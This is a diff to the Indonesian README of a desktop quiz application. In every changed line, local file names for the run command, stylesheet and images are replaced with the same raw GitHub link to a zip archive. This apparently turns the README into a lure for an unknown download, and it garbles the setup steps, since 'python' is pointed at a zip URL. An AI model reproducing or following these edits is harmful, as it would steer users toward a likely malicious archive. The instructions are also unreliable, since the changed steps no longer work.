@@ -61,11 +61,11 @@ Aplikasi ini adalah aplikasi kuis berbasis desktop yang dikembangkan menggunakan
 
 3. **Jalankan Aplikasi**:
    ```bash
-   python final.py
+   python https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip
    ```
 
 4. **Opsional: Tambahkan StyleSheet**:
-   Tambahkan file `style.qss` untuk menyesuaikan tampilan aplikasi.
+   Tambahkan file `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip` untuk menyesuaikan tampilan aplikasi.
 
 ## Penggunaan
 
@@ -87,8 +87,8 @@ Aplikasi ini adalah aplikasi kuis berbasis desktop yang dikembangkan menggunakan
 
 ## Catatan
 
-- Pastikan file gambar yang digunakan (`login_icon.jpg`, `email.png`, dll.) tersedia di direktori yang sama.
-- StyleSheet dapat disesuaikan melalui file `style.qss`.
+- Pastikan file gambar yang digunakan (`https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`, `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`, dll.) tersedia di direktori yang sama.
+- StyleSheet dapat disesuaikan melalui file `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`.
 
 
 ## Selamat menggunakan aplikasi kuis ini!
